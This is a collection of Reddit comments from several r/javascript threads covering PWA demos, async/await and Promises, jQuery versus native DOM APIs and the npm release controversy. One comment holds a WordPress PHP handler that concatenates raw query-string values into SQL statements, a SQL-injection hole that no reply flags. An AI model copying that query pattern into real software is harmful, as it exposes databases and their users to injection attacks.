agreed it's a bad example. A better hello world for PWA would be a classic TODO / grocery list app. It's useful offline but user doesn't have to install an actual ios/android app. 
I tried async/await. Didn't seem to work for child_process/await
You are mostly right, in a more advanced stage of the project, instead of displaying values as 0 it could display the latest available locally (from the last online visit).
I would use (d3-queue.js)[https://github.com/d3/d3-queue], which would allow you to iterate over your arbitrary number of filenames like it looks like you want to, then call your printing function. Depending on what your input and output structures actually look like, it might be possible to shortcut this further. 
&gt;https://github.com/karlveskus/todo-app 404?
The Todo App looks good and seems to do what's expected. Data in local storage is kinda nice as it's there when I come back to it later. The red 'x' to remove a task feels like it's out of place appearing below the checkmark. Perhaps float it to the right where I won't hit it my accident. The Github link isn't working, perhaps it's moved or no longer public. 
Some general ideas for PWA: * mail app that allows you to read/write emails even if you're offline (hospital/airport w no service) * calculator (sunrise/sunset, moonphase, temperature conversions) * camera filter app * game (as you mentioned) These don't require internet, you can use while camping for example. &gt; I would like my app to show me no internet connection rather than showing me 17° when actually it is 25°C outside. Agreed. This is just a UX improvement and not a mark against PWAs imo. 
This is absolutely beautiful. Love the design. You're a designer yourself?
To answer on why JS is asynchronous in nature: JS started with the intent of making websites more interactive (think making collapsable elements not SPAs). One way to do this was to have the language support an event-driven paradigm (a paradigm already heavily used in desktop apps). This is seen in the browser-flavor JS as event listeners and you'll notice that's mainly how JS is supposed to be run in the browser. Since you can't predict when events and how many events there are gonna be, it makes sense to give a more asynchronous feel to the language. Now fast forward to when Node came about and you'll see this style embraced even furthure. You now have events for all IO processes. This is actually a pretty good thing, since IO is async in nature. So why shouldn't your code reflect that? It also gave NodeJS a place not already occupied by other mature languages. You could argue NodeJS could have done better by going even more in that direction and make it an Actor-oriented programming language. This would have been a LOT better but that's just my opinion, as it would have made Node actually scalable rather than what we got. To make yourself more comfortable with the idea of how IO can be async, think of a scenario where your JSON file is 40 GB in size. Would you want your program to just freeze (and eventually crash) while it processes it? Or would you want to handle it piece by piece, in a non-blocking way?
You could wrap it in a function that returns a promise. Something like this: function funcWithCallbackWrapped() { return new Promise((resolve, reject) =&gt; { funcWithCallback().then((data) =&gt; resolve(data), (err) =&gt; reject(err)); }); }
I think it's a common feeling. It's so easy to get stuck, especielly when so much other stuff is going on in your life. That's why I reached out. I really wish there was a community where more experienced developers could take on junior developers.
Dont know why you’re being downvoted. Would be great if people actually discussed it instead of just down voting.
Thank you very much. This is exactly what I wanted. Yeah I've used mocha quite a lot locally but I wanted to be able to use it like this in a editor. Thanks again.
Fix the link to the repo as it would be nice to see the code. The styling is nice just float that Red Cross over to the right it would look more natural. Good work!
Because you want to be able to execute / continue code even if your files are large and may take an indeterminate amount if time to process. On the web, the merits of doing this async is much more obvious. You should use Promises or async / await to get the order of execution you desire. 
Should the tests really be pointing to the solutions files instead of the challenges.js file?
The advantage of asynchrony is not apparent when you're only doing one single task such as the example you provide. The advantage becomes apparent when you have a lot of tasks to do (like in a node.js server serving many requests concurrently, or in a web page in which a great many scripts and/or rendering computations are being performed) *and some of those tasks have to wait for potentially slow external resources* (like disk reads and network requests). In that case, asynchrony allows for greater efficiency. While one task waits on an external resource, other tasks can be running. Because Javascript runs in a single threaded interpreter, asynchrony is the only way to make use of those periods in which the external resource is preventing the forward progress of a particular task.
I agree, but this is Reddit, so I'll take my (only) -1 score and be glad it wasn't worse ;)
You're assuming Drawman101 said "Using Babel", but the discussion is about the non-Babel implementations of ES6 modules.
One would think. 
Use Array.from wrapped around your document.querySelectorAll 
&gt; https://karlveskus.github.io/todo-app/ Sorry, repo was private. Now its public again. :) 
Great article!
Yeah, repo was private. My bad. Can you send me screenshot of this error, because in my browser they are aligned (probably/hopefully already fixed it as well).
Fixed the red cross now. Thanks
Great article!
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [victorgarciaesgi/Moving-Mate/.../**SearchMoving.vue** (master → 97b5f02)](https://github.com/victorgarciaesgi/Moving-Mate/blob/97b5f026b6e27cc89d1e4dc4cfd8af6f89cfbbde/src/components/views/Moving/SearchMoving.vue) ---- 
The only thing that jumps out at me is that you could use `const` in many places where you currently use `let`. Doesn't particularly matter for something this small, though.
In my opinion todos should stay in the order they were added. Currently if you add some, complete a couple then toggle between the views, it reorders them
I don't think play() is supposed to accept any parameters. https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/play &gt;Thanks! Could it be that I'm using audio as a var also? No, because it's case-sensitive, but you should probably avoid doing that anyway to reduce confusion.
Assuming you were using node's fs, there's fs.readfileSync that would have behaved just like you'd expect. But the whole point of JS is that you use asynchonous operations to make browsing smooth and servers scalable.
Sounds like you need to use [Promise.all](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all). Pseudo-ish code: const listOfFileNames = ...; // step 1 and 2 // Read files, each one asynchronously const filesReadPromises = listOfFileNames.map(fileName =&gt; new Promise((resolve, reject) =&gt; { fs.readFile(fileName, (err, data) =&gt; { if (err) reject(err); resolve(data); }); })); // Wait for every file to be read Promise.all(filesReadPromises).then(listOfFileData =&gt; { // now do step 4 });
Thanks. Promises are another thing that I find mind boggling but it looks like a good time for me to start.
Great! Nice work ! Wich vue pwa's template do you use ?
I keep getting to 10 bounces and it resets to 6 :( I just want the poem. 
Looks good but heads-up, it's "collar"
You can still use an ORM in functional JS. Reading/Writing to a DB is a side effect in the first place, but the rest of your code can still be declarative/lazy which better suits functional style. For example you could use Knex.js query builder to read from a table but wrap it in a Task/Future monad. 
https://github.com/peter-valkov/advanced-json-path Sure, check out the repo and include it (from the lib directory) in your code. 
why can't you learn npm? its going to be a real pita if you want to use node without npm. Most of the time all you do is type `npm i`
&gt; Is this a joke? No, it's javascript.
I don't want to use node or npm. Eventually I am sure I will, but it's not that important for me at the moment. 
Agree, I started in 2014 to program and I always had at least on client every week, who wants a site. Then I stopped for two years and started abour few month again and oh boi how times have changed. It's much, much harder to find a client because Wix, they want to program by themself to save money. And I am looking for a job and I know React, a pretty good looking site and tons of other technologies but they not even invite me for an interview. Nowdays you have to know PHP and Mysql for Front End position, or they just want Fullstack.
This doesn't even make any sense. How do you plan to use the library without Node? How do you plan to `require` it? Black magic? Please, do not try to self-manage dependencies by cloning the source. This would be a nightmare and tools like npm exists for the very purpose of handling these things for you. Please do it properly and save yourself some headaches down the line.
Turning location on, loading the page, turning it off and reloading doesn't give the last fetch data .. it will only tell us to connect to the internet
It's just a single js file, so in this instance it is working fine. 
oh. well npm is the package manager for node (that's what NPM stands for).
Not mine. Made by https://twitter.com/dsenneff
Hi /u/ddmac-0, For javascript help, please visit /r/LearnJavascript. Thank you!
It'll be interesting to see whether they work on correctMkdir in the near future.
I was about to update npm. Then thought man its friday, why start work so early. Let me reddit a bit. And now my weekend is saved.😂
Mongoose has light schemas if that’s all you’re missing. If you want better relationship modelling more detailed schemas and lots of play with check out graphql. I’ve personally found that most OO ideas not add much value in JavaScript, coming from a number of years writing OO C#. 
Sure, maybe in crazytown that's a "revert". The proper way to revert out of an outage/bad deploy/broken release is to roll the whole thing back to a known stable commit (previous tag is usually a good bet). If this was an actual a git revert, then this commit should've reverted any tests that were committed with the offending commit. Since there aren't any, then either they didn't write tests the first time around _and merged an untested broken onto a production-reachable stream_, or worse, they manually wrote a fix for something that hadn't been tested, and pushed it _again_ to that same production-reachable stream without testing a _second time_. This is absolutely insane, especially consider this bug could wreck people's production servers (and did).
Well what you are saying doesn't make much sense `await` does exactly the same thing as `.then` behind the scenes
I love the simplicity, make it a iOS app 
The callback is fired in the context of the current DOM element, so with an ordinary function, the keyword this refers to the element. But arrow functions never result in a new `this` context.
An arrow function does not create a new `this`. The `this` you are accessing in the arrow function is the same one as outside that scope
Oh I see!
**If you had 10 more days to deploy JavaScript, what would you have done differently?** I would have finished some of the features, notably closures (nested functions and function expressions), which had to await later releases of Netscape. I would have not over-minimized and overloaded functions and object prototypes, instead splitting special forms for methods (which take a this receiver-object parameter) from constructors and other variants all done via functions. I would have held fast to my 10-day design of == which evaluated to false if its operands had different types (I changed the == and != operators after the first 10 days in response to early Netscape adopter request that 200 == “200”).
It's so weird seeing JQuery stuff mixed with newer ES syntax. The native APIs for what this snippet does are easier to use. 
Thanks man! I am mainly a back-end developer, just started dabbling on front-end last year. 
You have quite a lot of scripts on that page, do you have any idea which one might be controlling it?
Yeah I just had a web dev quit but he wasn't the one who did the bulk of the homepage coding so am a bit lost. It might be a flex slider plugin that came with the theme as I see some of those tags when I do inspect element but when I went to adjust the speeds on the plugin settings page nothing happened. In visual composer, I edited the column that houses the testimonial slider and that was at the top with just basic html to produce the rest of the slides. So theres short code, js, css and a bunch of other crap as you noted. I think the original guy used 3 different sliders just on the homepage. I'm thinking if I can't find it of deleting it and using one of the other sliders but not sure if I can get it to have the 'read more reviews' link as it only allows images. Will figure something out. Thanks!
Cool!
I've never touched WP or visual composer before, but: I saw that it was in `&lt;div class="flexslider"` so I opened all the .js and searched for "flexslider" and found https://faustharrisonpianos.com/wp-content/mmr/33a3caab-1519167586.min.js which seems to be related to wpcf7, so I googled `wpcf7 flexslider` and found https://gist.github.com/puikinsh/0f3117087130ddaaa397 $('.flexslider').flexslider({ slideshowSpeed: 7000, //Integer: Set the speed of the slideshow cycling, in milliseconds animationSpeed: 600 //Integer: Set the speed of animations, in milliseconds }); So that's probably the sort of place you should start
THIS is extremely valuable feedback. We don't know how much users would actually click "Allow" for your website to know your location. A huge population is already used to the prompt on their smart phones and just naturally dismissing/denying it.
Thank you thats very helpful. I was thinking about something like this but didn't know whether or not this was a good place to start because it is moving at a specific speed. But not sure if it is moving at a default speed that automatically steps in if no speed attribute/value is given if that makes sense. So if you don't tell it how fast to go it has a default value it goes by. And if I add one of the attributes you posted it will override the default value and go by what I tell it. Thanks again!
Hey, this is an inspiring project. However I created a demo project and set up the registerServiceWorker codes like what's in your repo, the "yarn build" doesn't output anything related to the service worker, no "service-worker.js" nor the "precache" file got generated. Do you modified anything in your local webpack config or there was something I missed from your repo I wonder?
As others kind of mentioned, arrow functions do not have their own this-scope. They keep the scope of the surrounding function. However, jquery passes some arguments to the callback you specify, in this case the index of the element in the list and the element itself. In the following example, "value" is basically your "this": $('.tag.active').each( (index, value) =&gt; { $(value).removeClass('active'); }); To be honest, I find it cleaner to do it like that anyway, instead of using a misteriously available this value that somehow holds the value of the item, for whatever unkown reason.
in if else the else doesn't necessarily mean its an error wheras in the try catch the catch signifies that it is an error. So if baz is supposed to handle errors then try catch would be more appropriate, but if baz is just an alternate or default then if else is appropriate. 
Look, I've a vast experience working as freelancer and now I moved to New Zealand so I had to find a job in an office and I think there is a big difference. As freelancer (mostly startups), yes, I agree with you and basically everybody is looking for a Fullstack, but as an employer things change (at least that's my experience). Solid companies (no young startups) look for professionals focused on specific areas. My suggestion for you is to apply for positions as employee, not to avoid been fullstack, but because as you said, you're starting again, so it would be good for you to have some other developers around you to help you to improve your skills. Good luck in your finding dude :)
Worth noting that you don't really need jQuery to do this anymore. This is doable in Vanilla JS: Array.from(document.querySelector('.tag.active')) .forEach(elm =&gt; elm.classList.remove('active) Some might say jQuery is a little cleaner, which I could see, but it's also a little opinionated and has weird quirks that aren't very straightforward, as you've run into. This is a nice resource to look into: http://youmightnotneedjquery.com
You don't even need Array.from if you're on a modern browser (and if you're not, that's what polyfills are for).
it doesn't seem to remember my choice of Fahrenheit temp
&gt;The only problem is that the URL works! Not for me. Both URLs return "fail" and 404: http://www.wetcheck.com.au/wp-content/plugins/mobivate-sms/claim_check.php?verification_c=423423&amp;claim_id=7325&amp;userid=90 http://www.wetcheck.com.au/wp-content/plugins/mobivate-sms/claim_check.php?verification_c=41234&amp;claim_id=7325&amp;userid=90 By the way, it's quite simple to use vanilla JS instead of jquery for something like this.
Really? That is so strange. They work both in Incognito and regular browser on Safari. I don't think you typed in the correct URL because when I paste the first URL you provided into https://www.url2png.com I do get a page come up: http://prntscr.com/iimcu2 It should just be a white page with the words 'fail' on it
&gt;It should just be a white page with the words 'fail' on it As I said: &gt;Not for me. Both URLs return "fail" and 404 "fail" is their (minimal) custom 404 text. You might try pinging a resource that actually exists instead?
My point was that JavaScript is not the only language or tool that has seen improvement, and that choosing it for your backend is by no means a no-brainer, especially if you would be replacing an existing one. But fair enough, I don't disagree with anything in this post, and may have misunderstood you originally. Web development as a whole has definitely gotten better even during the relatively few years I've been doing it, and the future is looking better still.
Try using the array iteration methods instead, they're clearer and more composable: ECMAScript's Array contains a number of built-in methods for iteration (e.g., map, reduce, every, some, filter, and forEach). They relieve the need for manual iteration, provide better abstraction than a `for` loop, and make it clear what your iteration is doing. See https://gist.github.com/ljharb/58faf1cfcb4e6808f74aae4ef7944cff
The resource exists - I am echoing the words 'fail' in it... but maybe I can try echoing something else?
Also are you able to send a screenshot of what you see?
I think you are confused - 'fail' is what I want the page to say. It's a blank page with the words 'fail' on it - perhaps you saw it and assumed it was a resource that doesn't exist. Just to clarify it is a blank page on which I wrote 'fail' on - the page exists - I created it - and I put the words 'fail' on it.
It's exactly the same thing you see, which is "fail" with 404 status.
You're not even comparing like to like in your snippets, your first is acting on a single item and the second is equivalent to OP's snippets. // JQuery on 1 $(selector).removeClass(cls) // Native on 1 document.querySelector(selector).classList.remove(cls) // JQuery on multiple $(selector).each(function() { $(this).removeClass(cls) }) // Native on multiple document.querySelectorAll(selector).forEach(function(node) { node.classList.remove(cls) }) Calling the JQuery terse sure, but idiomatic? Nah not really, maybe ten years ago, but it's pretty far from idiomatic. Plus `$` is just an alias so most of the terseness can be achieved by aliasing `document.querySelector` to `$` and `document.querySelectorAll` to `$$`
If that's what you want it to say, and you want people to use it, then you should return a status of 200, not 404 (as it does currently).
Ah ok... here is the code I have though: &lt;?php header('Access-Control-Allow-Origin: *'); require('../../../wp-blog-header.php'); require_once("../../../wp-config.php"); require_once("../../../wp-includes/wp-db.php"); $userid = $_GET['userid']; $vcode = $_GET['verification_c']; $claimid = $_GET['claim_id']; global $wpdb; $qry = "SELECT * FROM `wp_postmeta` WHERE `post_id` = ".$claimid." AND `meta_key` = 'verification_code' AND `meta_value` = '".$vcode."'"; $result = $wpdb-&gt;get_row($qry); if($result) { $qry = "SELECT * FROM `wp_posts` WHERE `post_author` = ".$userid." AND `post_type` LIKE 'job_listing'"; $result = $wpdb-&gt;get_row($qry); if($result) { //update_post_meta($result-&gt;ID, '_claimed','1'); echo "success"; } else { echo "nope"; } } else { echo "nope"; } ?&gt; As you can see nowhere do I say that the page is to return a 404 status. Is there any input you have on how I could change the status response of the page?
Yeah NodeLists now have `.forEach()` which is super nice but if you wanted to do something like `.map()` or `.filter()` The `Array.from()` method is nice (but avoidable if you're using ES6+ with spreading as you can just do `[...document.querySelectorAll('.tag.active')]`)
I mean how can something exist and yet return a 404 status code?
I would move test dependencies to devDependencies in package.json
http://taskq.ibrahimtanyalcin.com/ - [**Medium**](https://medium.com/@ibowankenobi/pausing-resuming-browser-app-logic-using-taskq-js-884ec5a8ce86) - [**Other examples**](https://github.com/IbrahimTanyalcin/taskq#examples-) This is a 6kB module system that works with async script tags + dynamic imports. Has 2 threads (main + for dynamic) and allows you to dynamic load scripts within main thread while pausing it, this way you can react to client's browser. Allows recursive imports without blowing the stack(yes, a script that imports itself infinetely) It has least impact on browser since it combines 2 microtask queues (rAF + Promise (if possible)). Will fallback to rAF only on older browsers. You do not need to touch a single line of Babel, shim, polyfill or any bundler. Some people might have trouble with understanding the gap it fills, however if you carefully look at the examples, you will see that there are things that simply can't be done with bundlers or plain ES6 features alone.
This isn't mean to spam, but i read the explanation on github, context bound to lifecycles, mapping context to props, etc. We faced the same problem at work. Maybe you like to check out the solution we made as it's more complete: https://github.com/drcmda/react-contextual It maps context props like reduxes connect would, so components can pick state and only re-render when necessary. It also solves lifecycle bound context (namedContext) and context sharing. Both are pretty hard with the raw context api unfortunately. : (
Isn't the "jQuery" library the reason .this holds the value =)
If you're already rocking a babel setup and are daring enough to use stage 1 features. Check out the [null-conditional operator](https://github.com/tc39/proposal-optional-chaining). Else I would always go for the if check where you put all nul/undefined checks in a single expression. Do not use try/catch for control flow, ever.
&gt; I would have held fast to my 10-day design of == which evaluated to false if its operands had different types (I changed the == and != operators after the first 10 days in response to early Netscape adopter request that 200 == “200”). We need to hunt down this early adopter and kill them. I like JS and I dynamic typing, but JS's type coercion is one of the worst things about it.
&gt; I would have held fast to my 10-day design of == which evaluated to false if its operands had different types (I changed the == and != operators after the first 10 days in response to early Netscape adopter request that 200 == “200”). We need to hunt down this early adopter and kill them. I like JS and I dynamic typing, but JS's type coercion is one of the worst things about it.
Scroll down to "If you like to provide context" and look into some of the live demos. namedContext in particular creates context in componentDidMount and removes it in componentWillUnmount. modeContext on the other hand creates a singleton, but ties it to the class, so that you can refer to it in the subscribe hoc. 
Unpopular opinion, but Coffeescript is so much better to read than JS
Well global installs are easier for novices and people who don't know what to do with a $PATH variable. It's easier to tell people to perform a global install than to teach them how to use their environment effectively. If you needed to write install instructions for your big influential project, wouldn't you rather suggest a simple `sudo` command than teach your users how unix works? There are a handful of tools you may want globally accessible. For example I have yarn, gulp, and bower installed globally, but I got them packaged for my linux distribution rather than using npm as a secondary package manager.
That is a very interesting implementation. 🤔
Can you please explain further how to do it without global install ? Newbie here and don't know much about $PATH
So you yourself, a self-proclaimed non-novice, have ran `sudo npm install -g` with at least 3 packages even though it's a terrible idea which you shouldn't really ever do?
Nowhere in there is "fail" either - you have "success" and "nope" but not "fail", so probably something in one of your requires is causing it. (assuming the URL is correct)
I spent so much time trying to figure this part out. ._.
So you yourself, a self-proclaimed non-novice, have ran `sudo npm install -g` with at least 3 packages even though it's a terrible idea which you shouldn't really ever do? Or are you saying that globally installing stuff with NPM is in fact a reasonable thing to do in certain cases? If that's what you're saying, what was your argument in the first place?
&gt;but I got them packaged for my linux distribution rather than using npm as a secondary package manager. So no, I've never done that. The npm install -g was performed in a fakeroot environment when the system-level package was built.
I am aware the way it renders is probably not the best (crazy divs). But I felt using canvas would be too much effort for now. Source: https://github.com/dougmaitelli/DigitalMatrix
Thanks "kdarkwolve". I am glad you liked the post. Cheers!!
Interesting thing about this is that this blog post was written by one of the people who switched to ayo.js project but then quietly returned as if nothing ever happened. One would think maybe it's time to try not being controversial after that.
That question was answered 1000 times before. Start with www.freecodecamp.com at beginning. It is free and practice time &gt; reading docs time
Yup, totally a design decision by JQuery (made way way way back, probably before the first version of jquery was shared).
Saying that one shouldn't use `new Array()` is completely wrong. What you wanted to say I believe was - 'Don't use `new Array()` to simply create empty `Array` instance, better use `[]`'. There are some cases when `new Array(int)` is just simpler to use than loops and other stuff. `const tenCounters = new Array(10).fill(0);` 
Thanks, I've already done most of free code camp though, as well as a lot of Udemy courses. I was meaning, more of being able to go back and forth with someone in real time and being able to ask specific question/get used to talking about code. 
Saying that one shouldn't use `new Array()` is completely wrong. What you wanted to say I believe was - 'Don't use `new Array()` to simply create empty `Array` instance, better use `[]`'. There are some cases when `new Array(int)` is just simpler to use than loops and other stuff. `const tenCounters = new Array(10).fill(0);` 
https://www.reddit.com/r/iamverysmart/comments/7zf9w7/go_fuck_yourself/ Hmm 🤔
Highly recommend: watchandcode.com
Beautiful
Yeah, that's true
also try/catch will almost always disable V8 optimizations for that whole function so if you're cautious about your performance, if/then is a better choice.
Hi, you could check out any tutorials on Youtube, for example, https://www.youtube.com/user/LevelUpTuts/playlists?shelf_id=0&amp;sort=dd&amp;view=1 and to grow up as a developer. Recommend a chrome extension for comfortable self-education https://chrome.google.com/webstore/detail/youtubetutor/dckbkafeokippmcaobfhlkfmafhfhbla And if you need some help you could write to FB or ask on any forums.
Hey, That's completely fine if you don't want to get into learning things like node or npm being a newbie. It's a decision that yoou are taking, which is fine. Yes, you can definitely download the library and incude it in your html file within a script tag. The only thing is you will not be able to automatically update it. Cheers!!
many features you and I use daily rely on type coercion. simple stuff like if (variable){..}
Just check the request in the dev tools. See which headers are sent on each request. One header might cause the error.
looks good! star from me.
lmfao !!! please tell me this is what's happening here as I don't know enough about the subject to decide PLEASE DIG DEEPER
The checkbox is not so easy to be touched on mobile devices. Consider using a bigger padding? Anyway it looks nice enough.
How would one solve an async await without try catch? Or is it snart enough to recognise that it's an async function and still do optimization !
Can you please elaborate on this? I am not sure what you mean or where I can check for the headers.
Also can you elaborate on what you mean by a 404 status? Where are you seeing the 404 status?
I just checked the status code on this URL: http://tools.seobook.com/server-header-checker/ And I got the following: http://prntscr.com/iiozw0 It seems the server is returning a 404 Not Found even though the page exists - which is very strange. I've never encountered this before.
Have you tried putting breakpoints in and see what codes run before and after the error is thrown? 
How would I do this? console logs?
Hey, I can completely understand what you are going through right now because I have been through the same phase during the initial days of my career. And I really wish I had mentor who could have guided me well and from whom I can ask my doubts anytime. Though there are many tutorials available online which you can go through and which people have suggested. But I would personally suggest doing some practical projects to have a deeper understanding of how things work. You can start with some really basic and small practical examples to start with. I can probably help you with it if you would like to. Hit me up, reply to my comment and we can connect. :) Cheers!! PS - I have more than 5 years of experience in this industry and I was the front-end lead in Cisco. Hope this helps to add to my credibility of helping you out.
/r/titlegore
Add manual location submit button, but looks great, nice design. A lot of users using proxies, vpn etc. Good luck.
Usually in other programming languages try/catch is using for exceptions. Use try/catch for exceptions and you will be fine.
https://www.faviator.xyz/ A simple easy favicon generator.
r/LearnJavascript is more appropriate for this type of question.
thanks you kind sir, what do you mean by it's "collar"?
Source??
There's a small small chance he's being a tiiiny tiny bit sarcastic since jQuery is a third party lib
I mean its good code but totally unnecessary for a vanilla todo list. Like there is way TOOOOOOOOO many files. All you need is a small JS file with an array that can store the todos. var Todos = [] var todoinput = document.getElementById('todo_enter') and then its just functions like push the todo as an object in Todos. Todos.push({todo: todoinput.value, id: (from a math.random function or whatever)}) and you can list the todos using a simple function by adding a div to the inner html and have a for loop for in Todos document.getElementById('Todolist').innerHTML += '&lt;li&gt;' + prop + '&lt;/li&gt;'; and say your listed/visible todos has a delete option in it then ya just splice if the id matches. 
Just learned that and thought it was worth sharing
Now you can just try/catch and not worry about it-V8 optimizes these functions since version 5.3. Previously you would just use the `catch` method on the promise API.
 I hope not
What problem are you experiencing? Did you try to do it and an error was thrown?
I'm gonna pull that down and say there's no chance. It's an account created the day this was posted with a single comment promoting this article. ...🤔
Pandora.js is an application manager dedicated to Node.js applications. The first release is built by Taobao Midway team mostly, and involves contributors all over Alibaba group. Thanks to the dev productivity brought by Node.js, a few lines of code can make a working web application. And Pandora.js can enable it with the operation capabilities, make it manageable, measurable, traceable and highly available. 
Just do it!
The Japanese yen bothers me. If you change the currency code to `JPY` it should put the ¥ in, but more importantly there is no way to get `0.42` yen
Which browser are you using? I’ll walk through chrome for example. Right click the page and select **inspect element**. This opens up the dev tools. From here go to the **network** tan and you can see the http requests that are made. Select the request that appears to have failed and look at the headers section to see what the error may be.
codementor.com is an online mentoring service
Yes, would be cool
functional paradigms can't be used absolutely everywhere in javascript since we usually are dealing with storing state in one way or another. Typically though, one tries to keep the state only in those outer edges (the presentation layer and the database layer) while keeping everything in between more or less functional. 
Thanks. Are you talking about the page that creates the ajax request or the page being requested? P.S. I'm using Safari. 
Yes.
Oh, actually if you change it to `JPY` is formats to `¥100`, so all's good!
Thank you!!
&gt; there is no way to get 0.42 yen Though currently, 1 USD = 106.73 JPY.
No, I didn't mean that as a _fix_. I meant you could try to see if that is the thing that is causing the error. Generally, you cannot set the `body`'s height.
[removed]
There is a tutoring site i use to tutor people in JavaScript. I charge 35 an hour but there are many other tutors you can look for. You get 40 dollars free and the first hour with any tutor is free if you’re not a match. Message me if you want a link this subreddit doesn’t allow me to post a link.
Or, you know, use yarn because npm devs are hacks and assholes to the community. 
Oh yeah. But it's not well supported by Safari, so a custom formatter func is (sigh!) a better idea.
Yeah no shit it can build vertically scalable apps. I also wrote a super lightweight and vertically scalable framework that stores data in `/dev/null`, here's how to scale it: * t2.nano * Stop instance * Change instance type * t2.micro * Start instance Boom! Consider yourself vertically scaled, bitch! 
Thats awesome !!! good job man.
Aha okey. It works setting body height on the other browsers, might it be that issue that Safari won't le me?
Yay! 2GB RAM just to read RSS /s
For those developing in React, try [react-world-price](https://github.com/jasonbarry/react-world-price)
Tis I! I'm really just experimenting. But thanks for your patience and guidance.
The code is very clean, great job! My only comment is that when I mark a task as 'active' (when I have the 'active' filter on) I expected it to disappear.
I had to write different logic inside .each() but I gave simpler one as an example.
Huh, didnt know this, thanks
Would be interested to hear
This response gets the core of my problem. My scenario is where foo should never knowingly be null. And the problem is the "baz has to make decisions based on 2 error states" one. In particular, the worst case for me here is where bar has a dependency that could throw more errors that I really don't want to be handling in baz because baz now has to care about far more than I think it should. The core issue here is I'm feeling like there's some tension between the conceptual purity of "exception handling" and a solution that's both simple and clean. The control flow here is simple, but it is essentially being used for exception handling. It may be that in this case I'm just missing a point that better architecture decisive would avoid the scenario I'm concernef about but it seems easy enough to run into. 
&gt;Don’t let anyone, especially incumbents with vested interests, define what is possible. Probably the best statement for anyone aspiring to be successful.
I feel like this is what makes people hate JavaScript. Yes, it's clever. Yes, it's terse. No, it's not readable. No, it's not reusable. function subsetOf(obj, props) { const subset = {}; for(prop of props) { subset[prop] = obj[prop] } return subset; } const x = {a: 1, b: 2, c: 3, d: 4}; subsetOf(x, ['a', 'c']); // { a: 1, c: 3 } Oh my god, I wrote more than 18 characters on multiple lines! JavaScript shouldn't be Perl.
Careful using PhantomJS with it
I looked over the thread in a github issue, but didn't see any of the devs posting there besides the message saying it was fixed. It just seemed like angry users on both sides, did I miss something?
Hey thanks for the reply. wow that would be great! I'll p.m you :) 
Thanks! I'll pm you
After doing a couple of recent dev interviews, I think this is very true. I'm still basically a designer. I need to bone up on my fundamentals. I finished the first part of the react class but I'm going to take a step back and focus on the vanilla stuff. 
Makes sense, gonna fix it. Thanks!
Well PhantomJS died quite some time ago..
It was one of the devs posting on twitter https://twitter.com/mikesherov/status/966693100876914688 There's also the classy hashtags on the 5.7.1 release blog post http://blog.npmjs.org/post/171169301000/v571
They are semantically two different things in my opinion. Is it in the normal flow of your application that foo can be null/falsy? If that is the case then the if block would better represent that. If it is not in the normal control flow that foo is null/falsy then the try/catch version would indicate that. Try/catch is usually saved for exceptional cases, as in cases that are truly exceptional and should not occur in the expected flow of your application. If foo being undefined is not truly exceptional normal control flow should suffice imo.
I meant “mark task as completed” not “mark task as active” lol. I edited my comment.
Nor is it included by default in Node.js
Yeah, I wouldn't say the devs got abusive. Maybe dismissive and passive-aggressive with the hashtags in the blog post, but as far as I can tell, the majority of the nastiness came from users defending npm (but to be fair, the complaining side had a fair share of trolls). With that said, the did downplay the issue, and didn't acknowledge a failure on their staggered release system which allowed the bad release to leak through normal-looking channels. Some also criticized them for not tagging it as a pre-release, making it look like a normal stable when in fact it wasn't.
Yeah :D But I still got your idea
At this point, fuck Safari. It is literally the new IE.
This is just golf. You're explicitly referencing the keys `a` and `c`. There's literally no practical use for this anti-pattern. If you want a function that does this, just use lodash or ramda or roll your own (see below). Sorry but I get really annoyed with people posting things like this here as if the syntax of the language is somehow a revelation that is in some way useful in and of itself. const reusable_pick = (keys, obj) =&gt; keys.reduce((acc, key) =&gt; { acc[key] = obj[key]; return acc; }, {}); // usage const obj1 = {a: 1, b: 2, c: 3}; const obj2 = {fish: 1, dog: 2, cat: 3}; pick(["a", "c"], obj1); // -&gt; {a: 1, c: 3} pick(["dog", "cat"], obj2); // -&gt; {dog: 2, cat: 3} 
Does he work at NPM though? It says behance.net on his twitter profile on the side, and he's not listed in the "meet the humans" section on npmjs.com ( https://www.npmjs.com/support )
oh damn I didn't know that - what's it been replaced with?
IIRC it was builtins. I don't recall probably.
Yes, it's an age old problem and there's no one good answer because it relies on people having the same perception of what is important. The long hand code solution is to check if it's null and if it is throw a new exception with an explicit message saying. "This parameter must never be null!". That error can propagate back up to callers who misuse your method. It makes it more obvious to other developers that this is supposed to never be null. It also means that any code you call from within your method never needs to check if it is null. Rolling these sorts of implicit logical decisions together is probably an abuse of the Single Responsibility Principle, it certainly makes the intent of the code less clear. It's shorter to let baz deal with the null exception, but it entwines code paths that never should have crossed. It is a very common and very old problem and in a whole bunch of languages. It's not so much that you're looking for a "Simple and clean" solution, you're looking for an "elegant" solution. The simple and clean one is to do as I said above: explicit check for null and throw a new exception stating that parameter should never be null. But it's inelegant because it feels like repetitive boilerplate and easy to miss. If it's not there, is that because you are allowed to pass in a null or did the developer forget to check? 
Ah OK - someone has revived it. The last release before that was January 23, 2016.... http://phantomjs.org/releases.html
What's the advantage over something like kubernetes?
I'll give it a shot! Never tried Stylus. Can you export non-css values? It would be nice to have an export for something like, $themes, which is an array of the themes my app supports.
Yea, pretty class-less. My entire office is discussing switching all of our angular projects over to Yarn now. I'll probably spike a angular app this weekend with Yarn and try it out. 
If ever there was precedence for mutiny and commandeering of an open source product for the betterment of its future and everyone, this would be it.
On the website it mentions “dog colars”, it’s spelled collars :)
There is. You just need to manually adjust your `minimumSignificantDigits` and `minimumFractionDigits` - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NumberFormat
for the life of me, i will never understand threads like these. just do the ama. why do you have to ask first? worst comes to worst, it gets buried and that answers your question.
Notice that this is *very* different. ECMA402 API does not convert currencies. It only formats them according to the locale preferences. The API you shared is for currency conversion.
Thanks! This is super helpful because it helps clarify to me why stuff seems kind of wonky in the way it's used. In particular 3. That's the way I've mostly seen it, but I didn't grok the new being that it added an empty object. #2 and #4 also seems to explain why React uses this the way it does. Basically when you bind something to this, and then call it without something to the left of the dot, instead of going global it goes the bound thing right?
It's kind of counterintuitive to call it _locale_ though, because it doesn't really depend on the client. If an item is advertised as 100 USD, you don't want it to display as 100 EUR just because the client is in Europe.
